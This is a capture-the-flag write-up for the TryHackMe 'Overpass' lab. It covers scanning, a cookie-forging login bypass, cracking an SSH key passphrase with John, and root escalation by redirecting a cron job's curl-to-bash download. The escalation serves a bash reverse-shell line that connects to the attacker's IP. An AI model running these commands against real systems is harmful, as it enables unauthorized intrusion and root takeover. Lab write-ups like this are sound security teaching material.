# TryHackMe-Overpass

## NMAP

```
nmap -sC -sV 10.10.124.118
Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-10 22:35 PKT
Nmap scan report for 10.10.124.118
Host is up (0.18s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 37:96:85:98:d1:00:9c:14:63:d9:b0:34:75:b1:f9:57 (RSA)
|   256 53:75:fa:c0:65:da:dd:b1:e8:dd:40:b8:f6:82:39:24 (ECDSA)
|_  256 1c:4a:da:1f:36:54:6d:a6:c6:17:00:27:2e:67:75:9c (ED25519)
80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Overpass
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

## PORT 80 

<img src="https://imgur.com/xcyfMJ0.png"/>


<img src="https://imgur.com/BulGTu9.png"/>

Download the file to see what's in it.

<img src="https://imgur.com/AvTo4vg.png"/>

There's also a source code in`golang` let's see maybe we can find something it in so we can exploit that binary.

<img src="https://imgur.com/HTCFWVM.png"/>


## Gobuster 

```
root@kali:~/TryHackMe/Easy/Overpass# gobuster dir -u http://10.10.124.118 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.124.118
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/11/10 22:50:19 Starting gobuster
===============================================================
/img (Status: 301)
/downloads (Status: 301)
/aboutus (Status: 301)
/admin (Status: 301)
/css (Status: 301)
```
We see that there's an `/admin` page 

<img src="https://imgur.com/fpxT1P0.png"/>

Looking at the source we can see 3 javascript files , we are interested in `login.js` so let's view the source code

<img src="https://imgur.com/fJJxGie.png"/>

This is a vulnerabale piece of code that would make  authenticate a user with invalid crdentials if he has a session so let's make a fake `SessionToken` with a browser extension named `EditThisCookie`


<img src="https://imgur.com/QUvzdrS.png"/>

On refreshing the page we will get the ssh key for `james`

<img src="https://imgur.com/YkdknxT.png"/>

But it's asking for the passphrase of `id_rsa` so we can get the hash of `id_rsa` with `ssh2john` and crack it with `johntheripper`

```
root@kali:~/TryHackMe/Easy/Overpass# /usr/share/john/ssh2john.py id_rsa > ssh_hash
root@kali:~/TryHackMe/Easy/Overpass# john --wordlist=/usr/share/wordlists/rockyou.txt ssh_hash 
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
james13          (id_rsa)
1g 0:00:00:03 31.13% (ETA: 20:37:40) 0.3125g/s 1444Kp/s 1444Kc/s 1444KC/s play646..play47
Session aborted

```
Then `ssh james@<ip> -i id_rsa`

<img src="https://imgur.com/vZId0He.png"/>

## Privilege Escalation

Host `linpeas.sh` on local machine and transfer it to target machine
<img src="https://imgur.com/uc27Vj1.png"/>

I didn't find anythin with linpeas so next thing that I looked at was a file `.overpass` in `james`'s home directroy , reading the content of the file it was gibberish 

`,LQ?2>6QiQ$JDE6>Q[QA2DDQiQD2J5C2H?=J:?8A:4EFC6QN.`

I visited https://gchq.github.io/CyberChef/

<img src="https://imgur.com/FKVZOP5.png"/>

This password is for `james` but still he is not in group `sudoers`
<img src="https://imgur.com/hSCBu72.png"/>

That was a rabbit hole then check for cronjobs

```
james@overpass-prod:~$ cat /etc/crontab 
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
# Update builds from latest code
* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash
james@overpass-prod:~$ 
```
looking at `/etc/hosts` we can change this localhost to our local machine's address and add a reverse shell in bash with path `<our_vpn_ip>/downloads/src/buildscript.sh`
```
james@overpass-prod:~$ cat /etc/hosts
127.0.0.1 localhost
127.0.1.1 overpass-prod
127.0.0.1 overpass.thm
# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
james@overpass-prod:~$ 

```
Now making directory `/downloads/src/buildscript.sh`

```
root@kali:~/TryHackMe/Easy/Overpass# mkdir downloads
root@kali:~/TryHackMe/Easy/Overpass# cd downloads/
root@kali:~/TryHackMe/Easy/Overpass/downloads# mkdir src
root@kali:~/TryHackMe/Easy/Overpass/downloads# echo "bash -i >& /dev/tcp/10.14.3.143/8080 0>&1" > buildscript.sh
root@kali:~/TryHackMe/Easy/Overpass/downloads# chmod +x buildscript.sh 
```
<img src="https://imgur.com/XDMf6VA.png"/>

And just like that we will get the reverse shell as `root` !